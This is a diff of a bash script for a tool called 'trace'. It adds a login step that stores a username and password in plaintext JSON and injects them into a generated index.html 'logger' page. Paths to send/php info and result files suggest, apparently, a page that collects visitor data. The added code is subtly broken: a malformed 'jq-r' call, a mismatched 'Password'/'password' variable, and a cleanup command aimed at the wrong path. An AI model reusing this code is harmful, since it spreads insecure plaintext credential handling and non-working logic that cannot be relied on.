@@ -58,7 +58,36 @@ for p in "${pkgs}"; do
 done
 #<<<=========Program=========>>>
 #collecting your name
-#lets tests for login page lol this program is in process not completed!! so dont use now
+if [ -f $CWD/maindb.json ]; then
+    uname=$(cat $CWD/maindb.json | jq -r .Login[].username)
+    Password=$(cat $CWD/maindb.json | jq-r .Login[].password)
+else
+    printf "\nLets authorise you to use ${S1}:: ${S4}trace${R0}\n\n"
+    printf "${S3}Enter a username: ${S4}"; read uname
+    printf "${S3}Enter a password: ${S4}"; read password
+cat <<- EQF >$CWD/maindb.json
+{
+    "Login": [
+        {
+            "program": "trace",
+            "author": "Suman Kumar ~BHUTUU",
+            "company": "BHUTUU",
+            "github": "https://github.com/BHUTUU",
+            "username": "${uname}",
+            "password": "${password}"
+        }
+    ]
+}
+EQF
+#<<<::::Create logger::::>>>#
+rm -rf $CWD/assets/index.html >/dev/null 2>&1
+while read -r M; do
+    echo ${M//€BHUTUUUNAME/$uname}
+done < $CWD/assets/loggerDummy > $CWD/assets/logger2
+while read -r N; do
+    echo ${N//€BHUTUUPASS/$password}
+done < $CWD/assets/logger2 > $CWD/assets/index.html
+rm -rf logger2 >/dev/null 2>&1
 #declare some variables
 Infos="$CWD/assets/send/php/info.txt"
 Result="$CWD/assets/send/php/result.txt"
